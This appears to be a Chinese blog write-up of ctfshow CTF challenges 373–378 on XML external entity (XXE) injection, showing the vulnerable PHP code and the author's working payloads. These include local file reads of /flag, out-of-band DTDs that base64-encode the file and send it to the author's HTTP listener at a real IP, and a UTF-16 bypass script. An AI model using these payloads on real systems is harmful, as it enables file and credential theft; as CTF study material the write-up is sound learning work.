---
title: xxe题目
date: 2021-12-25 13:06:11
tags:
      - xxe
      - ctf
categories: xxe
typora-root-url: ..
description: 一些xxe题目实践
---

## ctfshow

### ctfshow web 373

php://input

从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。

数据包中反倒是不管是get还是post,php://input都会<label style="color:red">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);//设置为false则允许外部实体加载
$xmlfile = file_get_contents('php://input');//将获取到的数据包内容转换成字符串
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &a; 这样的写法
    $creds = simplexml_import_dom($dom);//把 DOM 节点转换为 SimpleXMLElement 对象。
    $ctfshow = $creds->ctfshow;//找到里面的ctfshow标签
    echo $ctfshow;//输出ctfshow标签的内容
}
highlight_file(__FILE__);    



```

综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行

##### payload

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
//上面为内部dtd文档
<neo>
<ctfshow>&xxe;</ctfshow>
</neo>
```

### ctfshow web 374

本题没有回显,需要使用外带dtd

利用python在云服务器搭建一个http服务器,并保持监听

`python3 -m http.server 5555`

题目代码

```php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    

```

本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出



起初这样写了dtd文档

```dtd
<!ENTITY % b SYSTEM "http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag">
%b;
```

xml

```xml
<?xml version="1.0"?>
<!DOCTYPE a[
	<!ENTITY % xxe SYSTEM "http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd">
	%xxe;

]>
```

服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容

![image-20220110180025568](https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png)

 更改后的dtd文档

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % b SYSTEM "http://121.40.113.226:5555/%file;">
%b;
```

这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了......

![image-20220110180342295](https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png)

查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404

![image-20220110182024289](https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png)

##### payload

xml

xml通过前面的尝试已经完全理解了

```xml
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd">
%aaa;
]>
<test>123</test>

```

dtd

```dtd
<!ENTITY % dtd "<!ENTITY &#x25; xxe  SYSTEM 'http://121.40.113.226:5555/%file;'> ">
%dtd;
%xxe;
```

有两个问题,

第一个就是为什么要将%进行编码为`&#x25;`,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成`&#x25;`,未成功

第二个是为什么要实体里面包含实体,不能直接执行

`<!ENTITY % xxe  SYSTEM "http://121.40.113.226:5555/%file;"> 
%xxe;`

但是如果写成这样,请求的路径就还是dtd文档了![image-20220110183234994](https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png)

在尝试中一个偶然的错误让我有了启发,----我忘记给dtd中的url加端口了

![image-20220110183404676](https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png)

![image-20220110183422805](https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png)

此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写

![image-20220110183448490](https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png)

在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档

突然看到用payload的时候请求信息是两条,

![image-20220110185118318](https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png)

然后将dtd文档改成

`<!ENTITY % xxe  SYSTEM 'http://121.40.113.226:5555/1;'>
%xxe;`

请求路径还是两条

![image-20220110185242294](https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png)

这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style="color:red">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe

### ctfshow web 375

题目代码

```php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响

##### payload

xml

```xml
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd">
%aaa;
]>
<test>123</test>

```

dtd

```dtd
<!ENTITY % dtd "<!ENTITY &#x25; xxe  SYSTEM 'http://121.40.113.226:5555/%file;'> ">
%dtd;
%xxe;
```

### ctfshow web 376

这题只是将正则转变成了不区分大小写,payload还是同上375题的

### ctfshow web 377

题目代码

```php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);  
```

本题对http关键字做了过滤,但是xml可以用utf16编码

##### payload

```python
import requests
payload="""<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd">
%aaa;
]>
<test>123</test>"""
url="http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show"
requests.post(url=url,data=payload.encode("utf-16"))
```

有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢

这个是用burp抓的python发的包

![image-20220110205856482](https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png)

### ctfshow web 378

##### payload

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<user>
<username>&xxe;</username>
</user>
```

这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了.....

![image-20220110205445709](https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png)

